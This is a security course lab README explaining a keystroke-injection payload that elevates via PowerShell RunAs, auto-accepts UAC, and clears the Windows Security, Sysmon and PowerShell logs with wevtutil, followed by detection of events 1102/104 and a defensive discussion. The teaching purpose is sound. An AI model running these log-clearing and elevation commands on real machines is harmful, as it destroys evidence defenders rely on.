# Lab 14 — Anti-Forensics: Clearing Your Own Tracks

**Payload:** [payload.txt](payload.txt)
**Target:** Windows 10/11, local (non-domain) machine
**ATT&CK technique:** T1070.001 (Indicator Removal: Clear Windows Event
Logs)

Every payload before this one left evidence and hoped nobody looked. This
one is different: it's the attacker's *last* move, after everything else —
try to erase the evidence entirely. It's also, deliberately, the lab that
proves that's harder than it sounds.

## What it does, line by line

```
DELAY 1000        Wait 1s for the OS to recognize the HID device.
GUI r              Open the Run dialog.
DELAY 100
STRING powershell -Exec Bypass "saps cmd '/C ... ' -Verb RunAs"
                   Same elevation pattern as Lab 08: PowerShell uses
                   Start-Process -Verb RunAs to relaunch cmd elevated,
                   triggering a UAC prompt. The elevated cmd runs:
                     wevtutil cl Security
                     wevtutil cl "Microsoft-Windows-Sysmon/Operational"
                     wevtutil cl "Microsoft-Windows-PowerShell/Operational"
                   `wevtutil cl` clears (empties) the named event log.
ENTER              Submits the Run dialog.
DELAY 1000         Wait for the UAC prompt to render.
ALT y              Accepts the UAC prompt, same as Lab 08.
```

Net effect: three of the logs this course has relied on all along —
Security, Sysmon, and the PowerShell operational log — are wiped. Clearing
any of them requires administrator rights, which is why this payload
elevates first, just like Lab 08.

## Why you can't just erase everything

Run [detect.ps1](detect.ps1) after this payload and you'll very likely
**still find something.** That's not a bug in the detection — it's a
structural fact about how Windows logging works:

- The instant the **Security** log is cleared, Windows writes a new event —
  **1102, "The audit log was cleared"** — into the log that was *just*
  emptied. That event can't have been erased by the clear that created it,
  because it didn't exist until after.
- Clearing most other logs (Sysmon, PowerShell-Operational, etc.) writes a
  similar notification — **Event 104, "The `<LogName>` log file was
  cleared"** — but into the **System** log, a *different* channel than the
  one that got cleared.

This payload clears three logs but never touches **System**, so the 104
events for the Sysmon and PowerShell-Operational clears survive intact.

## Blue-team exercise

Run [detect.ps1](detect.ps1) on the victim VM. It checks:

- Security event 1102 (audit log cleared)
- System event 104 (other logs cleared)
- The Security log's current event count, as a sanity check against how
  long the VM has actually been running

## Think about it

- This payload clears Security, then Sysmon, then PowerShell-Operational —
  in that order — and never clears System. What would happen to the
  evidence in `detect.ps1`'s output if the attacker had cleared **System
  last**, after everything else? Would there be *any* local trace left at
  all?
- If a sufficiently thorough attacker can chain clears to remove every
  local trace, what does that tell you about relying on logs that live
  only on the machine that might get compromised? (This is the real-world
  argument for **centralized log forwarding** — Windows Event Forwarding,
  a Sysmon-to-SIEM pipeline, etc. — where the copy that matters isn't on
  the box an attacker controls.)
- Compare this to Lab 12's "honest gap" (file reads aren't logged at all).
  Which is the bigger problem for a defender: **evidence that was never
  created**, or **evidence that was created and then destroyed**? Do they
  call for the same fix?

## Cleanup

There isn't one — see [cleanup.ps1](cleanup.ps1), which is mostly a
reminder of that fact. Cleared logs cannot be restored by any script; a VM
snapshot revert is the only way to get a clean log history back.

**Next:** [Lab 15 — Full Chain: One Incident, Start to Finish](../Lab15_CapstoneChain/).
